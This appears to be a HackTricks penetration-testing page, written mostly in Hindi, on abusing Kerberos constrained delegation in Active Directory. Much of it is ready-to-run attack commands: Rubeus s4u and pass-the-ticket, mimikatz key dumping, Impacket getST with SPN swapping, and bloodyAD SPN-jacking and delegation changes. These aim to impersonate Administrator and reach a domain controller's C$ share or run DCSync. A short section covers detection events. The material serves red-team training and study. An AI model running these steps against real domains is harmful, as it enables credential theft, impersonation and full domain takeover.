# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

इसका उपयोग करके Domain admin किसी computer को किसी machine की किसी भी **service** के विरुद्ध **user या computer का impersonate करने** की अनुमति दे सकता है।

- **Service for User to self (_S4U2self_):** कोई भी **service account जिसके पास SPN है**, आमतौर पर किसी arbitrary user की ओर से स्वयं को TGS प्राप्त कर सकता है। यदि account के _userAccountControl_ में [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) भी है, तो वह TGS **forwardable** होता है। इसी वजह से protocol transition, **classic constrained delegation** के लिए सीधे उपयोगी होता है।
- **Service for User to Proxy(_S4U2proxy_):** कोई **service account**, **msDS-AllowedToDelegateTo** में सूचीबद्ध SPNs के लिए, किसी user की ओर से TGS प्राप्त कर सकता है। S4U2Proxy में इस्तेमाल किया जाने वाला evidence ticket, delegating service के लिए **forwardable** ticket होना चाहिए: या तो victim से capture किया गया वास्तविक client-to-service ticket, या **S4U2Self + T2A4D** से बनाया गया ticket।

**ध्यान दें**: यदि AD में किसी user को ‘_Account is sensitive and cannot be delegated_’ के रूप में चिह्नित किया गया है, या वह **Protected Users** का सदस्य है, तो आमतौर पर constrained delegation के ज़रिए उसका **impersonate करना संभव नहीं होगा**। आधुनिक domains में, delegation-enabled accounts को target करते समय केवल RC4 वाली धारणाओं के बजाय **AES** material को प्राथमिकता दें।

इसका अर्थ है कि यदि आप **service का hash compromise** कर लेते हैं, तो आप **users का impersonate** कर सकते हैं और बताए गए machines पर उनकी ओर से किसी भी **service** तक **access** प्राप्त कर सकते हैं (संभव **privesc**)।

इसके अलावा, आपको **सिर्फ़ उस service तक access नहीं मिलेगा जिसका impersonate करने की user को अनुमति है, बल्कि किसी भी service तक access मिल सकता है**, क्योंकि SPN (अनुरोधित service का नाम) की जाँच नहीं होती (ticket में यह हिस्सा encrypted/signed नहीं होता)। इसलिए, यदि आपके पास **CIFS service** का access है, तो उदाहरण के लिए Rubeus में `/altservice` flag का उपयोग करके **HOST service** का access भी पा सकते हैं। यही SPN swapping weakness, **Impacket getST -altservice** और अन्य tooling द्वारा भी exploit की जाती है।

साथ ही, **DC पर LDAP service का access** ही **DCSync** exploit करने के लिए आवश्यक है।

```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```

**ऑपरेटर नोट:** **gMSA/sMSA** की समीक्षा के लिए सिर्फ़ **ADUC** या BloodHound के screenshots पर भरोसा न करें। उन accounts में अक्सर सामान्य Delegation tab छिपा होता है, इसलिए सीधे raw **`userAccountControl`** और **`msDS-AllowedToDelegateTo`** attributes enumerate करें।

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```

### Protocol-transition बनाम Kerberos-only constrained delegation

अगर compromised account के पास **T2A4D** है, तो आमतौर पर आप केवल service key/TGT से पूरी **`S4U2Self -> S4U2Proxy`** chain पूरी कर सकते हैं।<sup>[[2]](#references)</sup>

अगर उसके पास केवल **`msDS-AllowedToDelegateTo`** है (classic **"Use Kerberos only"** mode), तो delegation का दुरुपयोग फिर भी किया जा सकता है, लेकिन S4U2Proxy के लिए evidence ticket delegating service के लिए **forwardable user-to-service ticket** होना चाहिए। एक तरीका है **LSASS/ccache** से victim TGS capture करना और उसे दूसरे stage में (`/tgs:` in Rubeus) देना। **Non-forwardable** S4U2Self ticket classic constrained delegation के लिए **पर्याप्त नहीं** है; अगर आपके पास यही एकमात्र evidence ticket है, तो इसके बजाय [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) देखें।<sup>[[2]](#references)</sup>

एक अन्य conditional route है delegating service तक पहला [RBCD](resource-based-constrained-delegation.md) hop: अगर इससे इच्छित user और service के लिए **forwardable** ticket मिलता है, तो उस ticket को बाद के Kerberos-only S4U2Proxy hop के evidence के रूप में जांचा जा सकता है। पहले ticket के flags, delegating service के SPN, उसके target allow-list और user delegation restrictions की पुष्टि करें; केवल RBCD attribute का control होना दूसरे hop को स्थापित नहीं करता।

### Cross-domain constrained delegation के नोट्स (2025+)

**Windows Server 2012/2012 R2** से KDC, S4U2Proxy extensions के ज़रिए **domains/forests के पार constrained delegation** को support करता है। आधुनिक builds (Windows Server 2016–2025) इस behavior को बनाए रखते हैं और protocol transition का संकेत देने के लिए दो PAC SIDs जोड़ते हैं:<sup>[[1]](#references)</sup>

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) जब user ने सामान्य तरीके से authenticate किया हो।
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) जब किसी service ने protocol transition के ज़रिए identity assert की हो।

जब domains के पार protocol transition का उपयोग किया जाता है, तो PAC में `SERVICE_ASSERTED_IDENTITY` मिलने की अपेक्षा करें; यह पुष्टि करता है कि S4U2Proxy step सफल हुआ।<sup>[[1]](#references)</sup>

### Impacket / Linux tooling (altservice और full S4U)

हाल के Impacket (0.11.x+) में Rubeus जैसी ही S4U chain और SPN swapping उपलब्ध है:<sup>[[2]](#references)</sup>

```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
         -impersonate Administrator contoso.local/websvc$ \
         -hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```

यदि आप पहले user ST forge करना पसंद करते हैं (जैसे, केवल offline hash के साथ), तो S4U2Proxy के लिए **ticketer.py** को **getST.py** के साथ इस्तेमाल करें। यदि आपके पास पहले से working ccache है और आपको केवल उसी host के लिए service class बदलनी है, तो **tgssub.py** भी काम का है। मौजूदा समस्याओं के लिए open Impacket issue #1713 देखें (जब forged ST, SPN key से मेल नहीं खाता, तो KRB_AP_ERR_MODIFIED मिलता है)।<sup>[[2]](#references)</sup>

### SPN-jacking: constrained-delegation target को redirect करना

Classic constrained delegation, `msDS-AllowedToDelegateTo` में एक **SPN string** को authorize करता है, न कि किसी immutable target SID को। S4U2Proxy के दौरान, KDC उस account को resolve करता है जिसके पास उस समय वह SPN है और उस account की long-term key से service ticket को encrypt करता है। इसलिए, delegating account पर control और किसी अन्य service/computer account पर `WriteSPN` होने से `SeEnableDelegationPrivilege` के बिना, delegation constraint को बदले बिना redirect किया जा सकता है।<sup>[[5]](#references)[[6]](#references)</sup>

इसके दो variants हैं:<sup>[[5]](#references)</sup>

- **Ghost SPN-jacking:** allowed SPN orphaned है, क्योंकि उसके पुराने owner को delete या rename कर दिया गया था, या उससे SPN हटा दिया गया था। इसे सीधे इच्छित target account में जोड़ें।
- **Live SPN-jacking:** SPN अभी भी source account के पास है। Duplicate-SPN validation आम तौर पर destination में बदलाव को रोकता है, इसलिए दोनों objects पर `WriteSPN` चाहिए: इसे source से हटाएँ, target में जोड़ें, ticket प्राप्त करें और फिर original registration बहाल करें।

नीचे दिया गया abstracted Linux flow, allowed SPN को move करता है, compromised delegating principal के रूप में S4U चलाता है और नए target पर उपयोगी service के लिए ticket का service name फिर से लिखता है।<sup>[[5]](#references)[[6]](#references)</sup>

```bash
# Omit this deletion for a ghost SPN
bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
  msldap delspn "$SOURCE_DN" "$DELEGATED_SPN"

bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
  msldap addspn "$TARGET_DN" "$DELEGATED_SPN"

getST.py -dc-ip "$DC_IP" -spn "$DELEGATED_SPN" \
  -impersonate Administrator -altservice "cifs/$TARGET_FQDN" \
  "$DOMAIN/$DELEGATING_ACCOUNT:$DELEGATING_PASSWORD"
```

`-altservice` दूसरा, अलग primitive है। S4U2Proxy ticket उस account के लिए encrypt किया गया था जिसके पास अब `$DELEGATED_SPN` है; क्योंकि ticket service name (`sname`) encrypted ticket body के बाहर होता है, tooling किसी दूसरे service class/hostname को substitute कर सकती है जिसकी service उसी account key का उपयोग करती है। SPN-jacking पहले बदलता है कि ticket को **कौन-सी account key** protect करती है, जबकि service-class substitution बदलता है कि **वह ticket कहाँ प्रस्तुत किया जाता है**।<sup>[[5]](#references)[[6]](#references)</sup>

Live jacking के लिए, legitimate service को बाधित करने से बचने हेतु ticket acquisition के तुरंत बाद दोनों LDAP writes को उलटे क्रम में करें। Computer-account auditing enabled वाले DCs पर Security event **4742** खोजें, जहाँ `servicePrincipalName` को एक computer से हटाया गया हो और कुछ ही समय बाद दूसरे computer में जोड़ा गया हो—खासकर जब SPN hostname, destination के `dNSHostName` से अलग हो। इसे event **4769** से correlate करें: S4U2Self में client/service के रूप में एक ही account प्रस्तुत होता है, जबकि S4U2Proxy में **Transited Services** भरा होता है।<sup>[[5]](#references)</sup>

### नियंत्रित account पर delegation कॉन्फ़िगर करना

इस तरीके के लिए computer या service account के delegation attributes पर **प्रभावी write access** (उदाहरण के लिए, `GenericAll`, या ACL में बदलाव के बाद `WriteDACL`) **और** LDAP change करने वाले account के लिए `SeEnableDelegationPrivilege` user right आवश्यक है। `msDS-AllowedToDelegateTo` में बदलाव करते समय Microsoft इस privilege की माँग करता है; केवल object-control rights से यह शर्त पूरी नहीं होती। Protocol-transition delegation सेट करने के लिए **bloodyAD** जैसे LDAP client का उपयोग करने से पहले, दोनों prerequisites की जाँच करें।<sup>[[Microsoft ADTS modify-operation security checks](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c714e48c-ea21-48b0-913d-fc065ab3dda3)]</sup>

```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```

मौजूदा computer account एक उम्मीदवार हो सकता है, भले ही `ms-DS-MachineAccountQuota` शून्य हो; यह quota डिफ़ॉल्ट रूप से नया computer बनाने के तरीके को सीमित करता है, किसी मौजूदा object पर अधिकारों को नहीं। कॉन्फ़िगर किए गए delegation का उपयोग करने के लिए, आपके पास delegating account की key या password का नियंत्रण, एक मान्य service principal name, और ऐसा target user होना भी ज़रूरी है जिसकी credentials delegable हों। इन शर्तों और directory पर प्रभावी access की अलग-अलग जाँच करनी चाहिए।

- Step 1: **अनुमत सेवा का TGT प्राप्त करें**

```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```

> [!WARNING]
> कंप्यूटर में SYSTEM हुए बिना **TGT ticket** या **RC4** या **AES256** प्राप्त करने के **अन्य तरीके** भी हैं, जैसे Printer Bug और unconstrained delegation, NTLM relaying और Active Directory Certificate Service abuse
>
> **सिर्फ़ उस TGT ticket (या hash) के होने से आप पूरे कंप्यूटर को compromise किए बिना यह attack कर सकते हैं।**

- Step2: **user का impersonation करके service के लिए TGS प्राप्त करें**

```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the constrained-delegation user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```

[**ired.team पर अधिक जानकारी।**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) और [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## References

- [1] [Kerberos Constrained Delegation का अवलोकन (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [Impacket के साथ Delegation का दुरुपयोग (भाग 2): Constrained Delegation (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Kerberos Constrained Delegation (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Kerberosity ने Domain को खत्म कर दिया: Offensive Kerberos का अवलोकन (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [5] [Elad Shamir - SPN-jacking: WriteSPN Abuse में एक Edge Case](https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/)
- [6] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
